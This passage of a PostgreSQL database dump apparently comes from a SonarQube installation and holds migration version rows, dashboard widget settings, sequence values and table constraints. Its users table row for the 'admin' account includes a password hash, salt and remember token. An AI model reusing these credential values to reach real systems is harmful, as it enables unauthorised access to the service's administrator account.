INSERT INTO schema_migrations (version) VALUES ('217');
INSERT INTO schema_migrations (version) VALUES ('220');
INSERT INTO schema_migrations (version) VALUES ('222');
INSERT INTO schema_migrations (version) VALUES ('235');
INSERT INTO schema_migrations (version) VALUES ('237');
INSERT INTO schema_migrations (version) VALUES ('238');
INSERT INTO schema_migrations (version) VALUES ('239');
INSERT INTO schema_migrations (version) VALUES ('252');
INSERT INTO schema_migrations (version) VALUES ('257');
INSERT INTO schema_migrations (version) VALUES ('283');
INSERT INTO schema_migrations (version) VALUES ('285');
INSERT INTO schema_migrations (version) VALUES ('286');
INSERT INTO schema_migrations (version) VALUES ('300');
INSERT INTO schema_migrations (version) VALUES ('301');
INSERT INTO schema_migrations (version) VALUES ('320');
INSERT INTO schema_migrations (version) VALUES ('350');
INSERT INTO schema_migrations (version) VALUES ('351');
INSERT INTO schema_migrations (version) VALUES ('353');
INSERT INTO schema_migrations (version) VALUES ('354');
INSERT INTO schema_migrations (version) VALUES ('355');
INSERT INTO schema_migrations (version) VALUES ('356');
INSERT INTO schema_migrations (version) VALUES ('358');
INSERT INTO schema_migrations (version) VALUES ('370');
INSERT INTO schema_migrations (version) VALUES ('387');
INSERT INTO schema_migrations (version) VALUES ('388');
INSERT INTO schema_migrations (version) VALUES ('391');
INSERT INTO schema_migrations (version) VALUES ('392');
INSERT INTO schema_migrations (version) VALUES ('398');
INSERT INTO schema_migrations (version) VALUES ('399');
INSERT INTO schema_migrations (version) VALUES ('401');
INSERT INTO schema_migrations (version) VALUES ('404');
INSERT INTO schema_migrations (version) VALUES ('405');
INSERT INTO schema_migrations (version) VALUES ('410');
INSERT INTO schema_migrations (version) VALUES ('411');
INSERT INTO schema_migrations (version) VALUES ('412');
INSERT INTO schema_migrations (version) VALUES ('413');
INSERT INTO schema_migrations (version) VALUES ('414');
INSERT INTO schema_migrations (version) VALUES ('415');
INSERT INTO schema_migrations (version) VALUES ('416');
INSERT INTO schema_migrations (version) VALUES ('417');
INSERT INTO schema_migrations (version) VALUES ('418');
INSERT INTO schema_migrations (version) VALUES ('419');
INSERT INTO schema_migrations (version) VALUES ('432');
INSERT INTO schema_migrations (version) VALUES ('433');
INSERT INTO schema_migrations (version) VALUES ('434');
INSERT INTO schema_migrations (version) VALUES ('441');
INSERT INTO schema_migrations (version) VALUES ('442');
INSERT INTO schema_migrations (version) VALUES ('460');
INSERT INTO schema_migrations (version) VALUES ('461');
INSERT INTO schema_migrations (version) VALUES ('463');
INSERT INTO schema_migrations (version) VALUES ('464');
INSERT INTO schema_migrations (version) VALUES ('465');
INSERT INTO schema_migrations (version) VALUES ('467');
INSERT INTO schema_migrations (version) VALUES ('480');
INSERT INTO schema_migrations (version) VALUES ('483');
INSERT INTO schema_migrations (version) VALUES ('486');
INSERT INTO schema_migrations (version) VALUES ('488');
INSERT INTO schema_migrations (version) VALUES ('492');
INSERT INTO schema_migrations (version) VALUES ('510');
INSERT INTO schema_migrations (version) VALUES ('511');
INSERT INTO schema_migrations (version) VALUES ('520');
INSERT INTO schema_migrations (version) VALUES ('530');
INSERT INTO schema_migrations (version) VALUES ('532');
INSERT INTO schema_migrations (version) VALUES ('533');
INSERT INTO schema_migrations (version) VALUES ('535');
INSERT INTO schema_migrations (version) VALUES ('536');
INSERT INTO schema_migrations (version) VALUES ('538');
INSERT INTO schema_migrations (version) VALUES ('540');
INSERT INTO schema_migrations (version) VALUES ('541');
INSERT INTO schema_migrations (version) VALUES ('542');
INSERT INTO schema_migrations (version) VALUES ('544');
INSERT INTO schema_migrations (version) VALUES ('545');
INSERT INTO schema_migrations (version) VALUES ('548');
INSERT INTO schema_migrations (version) VALUES ('549');
INSERT INTO schema_migrations (version) VALUES ('552');
INSERT INTO schema_migrations (version) VALUES ('555');
INSERT INTO schema_migrations (version) VALUES ('580');
INSERT INTO schema_migrations (version) VALUES ('581');
INSERT INTO schema_migrations (version) VALUES ('600');
INSERT INTO schema_migrations (version) VALUES ('601');
INSERT INTO schema_migrations (version) VALUES ('603');
INSERT INTO schema_migrations (version) VALUES ('604');
INSERT INTO schema_migrations (version) VALUES ('605');
INSERT INTO schema_migrations (version) VALUES ('702');
INSERT INTO schema_migrations (version) VALUES ('703');
INSERT INTO schema_migrations (version) VALUES ('704');
INSERT INTO schema_migrations (version) VALUES ('705');
INSERT INTO schema_migrations (version) VALUES ('706');
INSERT INTO schema_migrations (version) VALUES ('707');
INSERT INTO schema_migrations (version) VALUES ('708');
INSERT INTO schema_migrations (version) VALUES ('709');
INSERT INTO schema_migrations (version) VALUES ('710');
INSERT INTO schema_migrations (version) VALUES ('711');
INSERT INTO schema_migrations (version) VALUES ('712');
INSERT INTO schema_migrations (version) VALUES ('713');
INSERT INTO schema_migrations (version) VALUES ('714');
INSERT INTO schema_migrations (version) VALUES ('715');
INSERT INTO schema_migrations (version) VALUES ('716');
INSERT INTO schema_migrations (version) VALUES ('717');
INSERT INTO schema_migrations (version) VALUES ('718');
INSERT INTO schema_migrations (version) VALUES ('719');
INSERT INTO schema_migrations (version) VALUES ('720');
INSERT INTO schema_migrations (version) VALUES ('721');
INSERT INTO schema_migrations (version) VALUES ('750');
INSERT INTO schema_migrations (version) VALUES ('752');
INSERT INTO schema_migrations (version) VALUES ('753');
INSERT INTO schema_migrations (version) VALUES ('754');
INSERT INTO schema_migrations (version) VALUES ('755');
INSERT INTO schema_migrations (version) VALUES ('756');
INSERT INTO schema_migrations (version) VALUES ('758');
INSERT INTO schema_migrations (version) VALUES ('759');
INSERT INTO schema_migrations (version) VALUES ('760');
INSERT INTO schema_migrations (version) VALUES ('761');
INSERT INTO schema_migrations (version) VALUES ('762');
INSERT INTO schema_migrations (version) VALUES ('763');
INSERT INTO schema_migrations (version) VALUES ('764');
INSERT INTO schema_migrations (version) VALUES ('765');
INSERT INTO schema_migrations (version) VALUES ('766');
INSERT INTO schema_migrations (version) VALUES ('768');
INSERT INTO schema_migrations (version) VALUES ('769');
INSERT INTO schema_migrations (version) VALUES ('770');
INSERT INTO schema_migrations (version) VALUES ('771');
INSERT INTO schema_migrations (version) VALUES ('772');
INSERT INTO schema_migrations (version) VALUES ('773');
INSERT INTO schema_migrations (version) VALUES ('775');
INSERT INTO schema_migrations (version) VALUES ('776');
INSERT INTO schema_migrations (version) VALUES ('777');
INSERT INTO schema_migrations (version) VALUES ('778');
INSERT INTO schema_migrations (version) VALUES ('779');
INSERT INTO schema_migrations (version) VALUES ('780');
INSERT INTO schema_migrations (version) VALUES ('781');
INSERT INTO schema_migrations (version) VALUES ('782');
INSERT INTO schema_migrations (version) VALUES ('783');
INSERT INTO schema_migrations (version) VALUES ('784');
INSERT INTO schema_migrations (version) VALUES ('786');
INSERT INTO schema_migrations (version) VALUES ('787');
INSERT INTO schema_migrations (version) VALUES ('788');
INSERT INTO schema_migrations (version) VALUES ('789');
INSERT INTO schema_migrations (version) VALUES ('790');
INSERT INTO schema_migrations (version) VALUES ('791');
INSERT INTO schema_migrations (version) VALUES ('792');
INSERT INTO schema_migrations (version) VALUES ('793');
INSERT INTO schema_migrations (version) VALUES ('794');
INSERT INTO schema_migrations (version) VALUES ('795');
INSERT INTO schema_migrations (version) VALUES ('796');
INSERT INTO schema_migrations (version) VALUES ('900');
INSERT INTO schema_migrations (version) VALUES ('901');
INSERT INTO schema_migrations (version) VALUES ('902');
INSERT INTO schema_migrations (version) VALUES ('903');
INSERT INTO schema_migrations (version) VALUES ('904');
INSERT INTO schema_migrations (version) VALUES ('905');
INSERT INTO schema_migrations (version) VALUES ('906');
INSERT INTO schema_migrations (version) VALUES ('907');
INSERT INTO schema_migrations (version) VALUES ('908');
INSERT INTO schema_migrations (version) VALUES ('912');
INSERT INTO schema_migrations (version) VALUES ('913');
INSERT INTO schema_migrations (version) VALUES ('915');
INSERT INTO schema_migrations (version) VALUES ('916');
INSERT INTO schema_migrations (version) VALUES ('917');
INSERT INTO schema_migrations (version) VALUES ('918');
INSERT INTO schema_migrations (version) VALUES ('919');
INSERT INTO schema_migrations (version) VALUES ('920');
INSERT INTO schema_migrations (version) VALUES ('921');
INSERT INTO schema_migrations (version) VALUES ('922');
INSERT INTO schema_migrations (version) VALUES ('923');
INSERT INTO schema_migrations (version) VALUES ('924');
INSERT INTO schema_migrations (version) VALUES ('925');
INSERT INTO schema_migrations (version) VALUES ('926');
INSERT INTO schema_migrations (version) VALUES ('927');
INSERT INTO schema_migrations (version) VALUES ('929');
INSERT INTO schema_migrations (version) VALUES ('930');
INSERT INTO schema_migrations (version) VALUES ('931');
INSERT INTO schema_migrations (version) VALUES ('932');
INSERT INTO schema_migrations (version) VALUES ('933');
INSERT INTO schema_migrations (version) VALUES ('934');
INSERT INTO schema_migrations (version) VALUES ('935');
INSERT INTO schema_migrations (version) VALUES ('936');
INSERT INTO schema_migrations (version) VALUES ('937');
INSERT INTO schema_migrations (version) VALUES ('938');
INSERT INTO schema_migrations (version) VALUES ('939');
INSERT INTO schema_migrations (version) VALUES ('940');
INSERT INTO schema_migrations (version) VALUES ('941');
INSERT INTO schema_migrations (version) VALUES ('1000');
INSERT INTO schema_migrations (version) VALUES ('1001');
INSERT INTO schema_migrations (version) VALUES ('1003');
INSERT INTO schema_migrations (version) VALUES ('1004');
INSERT INTO schema_migrations (version) VALUES ('1005');
INSERT INTO schema_migrations (version) VALUES ('1006');
INSERT INTO schema_migrations (version) VALUES ('1007');
INSERT INTO schema_migrations (version) VALUES ('1008');
INSERT INTO schema_migrations (version) VALUES ('1009');
INSERT INTO schema_migrations (version) VALUES ('1010');
INSERT INTO schema_migrations (version) VALUES ('1011');
INSERT INTO schema_migrations (version) VALUES ('1012');
INSERT INTO schema_migrations (version) VALUES ('1013');
INSERT INTO schema_migrations (version) VALUES ('1014');
INSERT INTO schema_migrations (version) VALUES ('1015');
INSERT INTO schema_migrations (version) VALUES ('1017');
INSERT INTO schema_migrations (version) VALUES ('1100');
INSERT INTO schema_migrations (version) VALUES ('1101');
INSERT INTO schema_migrations (version) VALUES ('1102');
INSERT INTO schema_migrations (version) VALUES ('1103');
INSERT INTO schema_migrations (version) VALUES ('1104');
INSERT INTO schema_migrations (version) VALUES ('1105');
INSERT INTO schema_migrations (version) VALUES ('1106');
INSERT INTO schema_migrations (version) VALUES ('1107');
INSERT INTO schema_migrations (version) VALUES ('1108');
INSERT INTO schema_migrations (version) VALUES ('1109');
INSERT INTO schema_migrations (version) VALUES ('1110');
INSERT INTO schema_migrations (version) VALUES ('1111');
INSERT INTO schema_migrations (version) VALUES ('1112');
INSERT INTO schema_migrations (version) VALUES ('1113');
INSERT INTO schema_migrations (version) VALUES ('1114');
INSERT INTO schema_migrations (version) VALUES ('1115');
INSERT INTO schema_migrations (version) VALUES ('1116');
INSERT INTO schema_migrations (version) VALUES ('1117');
INSERT INTO schema_migrations (version) VALUES ('1118');
INSERT INTO schema_migrations (version) VALUES ('1119');
INSERT INTO schema_migrations (version) VALUES ('1120');
INSERT INTO schema_migrations (version) VALUES ('1121');
INSERT INTO schema_migrations (version) VALUES ('1122');
INSERT INTO schema_migrations (version) VALUES ('1123');
INSERT INTO schema_migrations (version) VALUES ('1124');
INSERT INTO schema_migrations (version) VALUES ('1125');
INSERT INTO schema_migrations (version) VALUES ('1150');
INSERT INTO schema_migrations (version) VALUES ('1151');
INSERT INTO schema_migrations (version) VALUES ('1152');
INSERT INTO schema_migrations (version) VALUES ('1153');
INSERT INTO schema_migrations (version) VALUES ('1155');
INSERT INTO schema_migrations (version) VALUES ('1156');
INSERT INTO schema_migrations (version) VALUES ('1157');


--
-- Data for Name: snapshots; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: user_roles; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: user_tokens; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO users (id, login, name, email, crypted_password, salt, remember_token, remember_token_expires_at, active, created_at, updated_at, scm_accounts, external_identity, external_identity_provider, user_local) VALUES (1, 'admin', 'Administrator', '', 'a373a0e667abb2604c1fd571eb4ad47fe8cc0878', '48bc4b0d93179b5103fd3885ea9119498e9d161b', '1a60c0cddd082d44f6a0c3ba0a1febd25c18a778', '2017-12-05 04:09:15.215', true, 1510817800271, 1511237355231, NULL, 'admin', 'sonarqube', true);


--
-- Data for Name: widget_properties; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (1, 7, 'filter', '1');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (2, 7, 'distributionAxis', 'createdAt');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (3, 9, 'filter', '2');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (4, 9, 'pageSize', '50');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (5, 10, 'filter', '1');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (6, 10, 'pageSize', '20');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (7, 11, 'filter', '1');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (8, 11, 'colorMetric', 'coverage');
INSERT INTO widget_properties (id, widget_id, kee, text_value) VALUES (9, 11, 'sizeMetric', 'ncloc');


--
-- Data for Name: widgets; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (1, 1, 'size', NULL, NULL, 1, 1, true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (2, 1, 'code_coverage', NULL, NULL, 1, 2, true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (3, 1, 'duplications', NULL, NULL, 1, 3, true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (4, 1, 'documentation_comments', NULL, NULL, 1, 4, true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (5, 1, 'rules', NULL, NULL, 2, 1, true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (6, 1, 'timeline', NULL, NULL, 2, 2, true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (7, 1, 'project_issue_filter', NULL, NULL, 2, 3, true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (8, 2, 'welcome', NULL, NULL, 1, 1, true, '2017-11-16 07:37:05.937', '2017-11-16 07:37:05.937', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (9, 2, 'measure_filter_list', NULL, NULL, 1, 2, true, '2017-11-16 07:37:05.937', '2017-11-16 07:37:05.937', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (10, 2, 'measure_filter_list', NULL, NULL, 2, 1, true, '2017-11-16 07:37:05.937', '2017-11-16 07:37:05.937', NULL);
INSERT INTO widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) VALUES (11, 2, 'measure_filter_treemap', NULL, NULL, 2, 2, true, '2017-11-16 07:37:05.937', '2017-11-16 07:37:05.937', NULL);


--
-- Name: active_dashboards_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('active_dashboards_id_seq', 2, true);


--
-- Name: active_rule_parameters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('active_rule_parameters_id_seq', 210, true);


--
-- Name: active_rules_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('active_rules_id_seq', 4133, true);


--
-- Name: activities_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('activities_id_seq', 4132, true);


--
-- Name: authors_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('authors_id_seq', 1, false);


--
-- Name: ce_activity_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('ce_activity_id_seq', 30, true);


--
-- Name: ce_queue_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('ce_queue_id_seq', 30, true);


--
-- Name: dashboards_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('dashboards_id_seq', 2, true);


--
-- Name: duplications_index_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('duplications_index_id_seq', 1, false);


--
-- Name: events_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('events_id_seq', 36, true);


--
-- Name: file_sources_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('file_sources_id_seq', 98, true);


--
-- Name: group_roles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('group_roles_id_seq', 104, true);


--
-- Name: groups_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('groups_id_seq', 2, true);


--
-- Name: issue_changes_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('issue_changes_id_seq', 3, true);


--
-- Name: issue_filter_favourites_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('issue_filter_favourites_id_seq', 1, false);


--
-- Name: issue_filters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('issue_filters_id_seq', 3, true);


--
-- Name: issues_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('issues_id_seq', 9, true);


--
-- Name: loaded_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('loaded_templates_id_seq', 17, true);


--
-- Name: manual_measures_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('manual_measures_id_seq', 1, false);


--
-- Name: measure_filter_favourites_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('measure_filter_favourites_id_seq', 1, false);


--
-- Name: measure_filters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('measure_filters_id_seq', 2, true);


--
-- Name: metrics_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('metrics_id_seq', 139, true);


--
-- Name: notifications_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('notifications_id_seq', 1, false);


--
-- Name: perm_templates_groups_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('perm_templates_groups_id_seq', 4, true);


--
-- Name: perm_templates_users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('perm_templates_users_id_seq', 1, false);


--
-- Name: permission_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('permission_templates_id_seq', 1, true);


--
-- Name: project_links_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('project_links_id_seq', 1, false);


--
-- Name: project_measures_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('project_measures_id_seq', 11668, true);


--
-- Name: project_qprofiles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('project_qprofiles_id_seq', 39, true);


--
-- Name: projects_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('projects_id_seq', 134, true);


--
-- Name: properties_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('properties_id_seq', 70, true);


--
-- Name: quality_gate_conditions_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('quality_gate_conditions_id_seq', 22, true);


--
-- Name: quality_gates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('quality_gates_id_seq', 8, true);


--
-- Name: resource_index_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('resource_index_id_seq', 4218, true);


--
-- Name: rules_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('rules_id_seq', 1260, true);


--
-- Name: rules_parameters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('rules_parameters_id_seq', 180, true);


--
-- Name: rules_profiles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('rules_profiles_id_seq', 34, true);


--
-- Name: snapshots_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('snapshots_id_seq', 300, true);


--
-- Name: user_roles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('user_roles_id_seq', 1, false);


--
-- Name: user_tokens_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('user_tokens_id_seq', 1, false);


--
-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('users_id_seq', 1, true);


--
-- Name: widget_properties_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('widget_properties_id_seq', 9, true);


--
-- Name: widgets_id_seq; Type: SEQUENCE SET; Schema: public; Owner: sonar
--

SELECT pg_catalog.setval('widgets_id_seq', 11, true);


--
-- Name: active_dashboards active_dashboards_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY active_dashboards
    ADD CONSTRAINT active_dashboards_pkey PRIMARY KEY (id);


--
-- Name: active_rule_parameters active_rule_parameters_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY active_rule_parameters
    ADD CONSTRAINT active_rule_parameters_pkey PRIMARY KEY (id);


--
-- Name: active_rules active_rules_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY active_rules
    ADD CONSTRAINT active_rules_pkey PRIMARY KEY (id);


--
-- Name: activities activities_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY activities
    ADD CONSTRAINT activities_pkey PRIMARY KEY (id);


--
-- Name: authors authors_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY authors
    ADD CONSTRAINT authors_pkey PRIMARY KEY (id);


--
-- Name: ce_activity ce_activity_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY ce_activity
    ADD CONSTRAINT ce_activity_pkey PRIMARY KEY (id);


--
-- Name: ce_queue ce_queue_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY ce_queue
    ADD CONSTRAINT ce_queue_pkey PRIMARY KEY (id);


--
-- Name: dashboards dashboards_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY dashboards
    ADD CONSTRAINT dashboards_pkey PRIMARY KEY (id);


--
-- Name: duplications_index duplications_index_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY duplications_index
    ADD CONSTRAINT duplications_index_pkey PRIMARY KEY (id);


--
-- Name: events events_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY events
    ADD CONSTRAINT events_pkey PRIMARY KEY (id);


--
-- Name: file_sources file_sources_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY file_sources
    ADD CONSTRAINT file_sources_pkey PRIMARY KEY (id);


--
-- Name: group_roles group_roles_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY group_roles
    ADD CONSTRAINT group_roles_pkey PRIMARY KEY (id);


--
-- Name: groups groups_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY groups
    ADD CONSTRAINT groups_pkey PRIMARY KEY (id);


--
-- Name: issue_changes issue_changes_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issue_changes
    ADD CONSTRAINT issue_changes_pkey PRIMARY KEY (id);


--
-- Name: issue_filter_favourites issue_filter_favourites_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issue_filter_favourites
    ADD CONSTRAINT issue_filter_favourites_pkey PRIMARY KEY (id);


--
-- Name: issue_filters issue_filters_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issue_filters
    ADD CONSTRAINT issue_filters_pkey PRIMARY KEY (id);


--
-- Name: issues issues_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issues
    ADD CONSTRAINT issues_pkey PRIMARY KEY (id);


--
-- Name: loaded_templates loaded_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY loaded_templates
    ADD CONSTRAINT loaded_templates_pkey PRIMARY KEY (id);


--
-- Name: manual_measures manual_measures_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY manual_measures
    ADD CONSTRAINT manual_measures_pkey PRIMARY KEY (id);


--
-- Name: measure_filter_favourites measure_filter_favourites_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY measure_filter_favourites
    ADD CONSTRAINT measure_filter_favourites_pkey PRIMARY KEY (id);


--
-- Name: measure_filters measure_filters_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY measure_filters
    ADD CONSTRAINT measure_filters_pkey PRIMARY KEY (id);


--
-- Name: metrics metrics_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY metrics
    ADD CONSTRAINT metrics_pkey PRIMARY KEY (id);


--
-- Name: notifications notifications_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY notifications
    ADD CONSTRAINT notifications_pkey PRIMARY KEY (id);


--
-- Name: perm_templates_groups perm_templates_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY perm_templates_groups
    ADD CONSTRAINT perm_templates_groups_pkey PRIMARY KEY (id);


--
-- Name: perm_templates_users perm_templates_users_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY perm_templates_users
    ADD CONSTRAINT perm_templates_users_pkey PRIMARY KEY (id);


--
-- Name: permission_templates permission_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY permission_templates
    ADD CONSTRAINT permission_templates_pkey PRIMARY KEY (id);


--
-- Name: project_links project_links_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY project_links
    ADD CONSTRAINT project_links_pkey PRIMARY KEY (id);


--
-- Name: project_measures project_measures_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY project_measures
    ADD CONSTRAINT project_measures_pkey PRIMARY KEY (id);


--
-- Name: project_qprofiles project_qprofiles_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY project_qprofiles
    ADD CONSTRAINT project_qprofiles_pkey PRIMARY KEY (id);


--
-- Name: projects projects_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY projects
    ADD CONSTRAINT projects_pkey PRIMARY KEY (id);


--
-- Name: properties properties_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY properties
    ADD CONSTRAINT properties_pkey PRIMARY KEY (id);


--
-- Name: quality_gate_conditions quality_gate_conditions_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY quality_gate_conditions
    ADD CONSTRAINT quality_gate_conditions_pkey PRIMARY KEY (id);


--
-- Name: quality_gates quality_gates_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY quality_gates
    ADD CONSTRAINT quality_gates_pkey PRIMARY KEY (id);


--
-- Name: resource_index resource_index_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY resource_index
    ADD CONSTRAINT resource_index_pkey PRIMARY KEY (id);


--
-- Name: rules_parameters rules_parameters_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY rules_parameters
    ADD CONSTRAINT rules_parameters_pkey PRIMARY KEY (id);


--
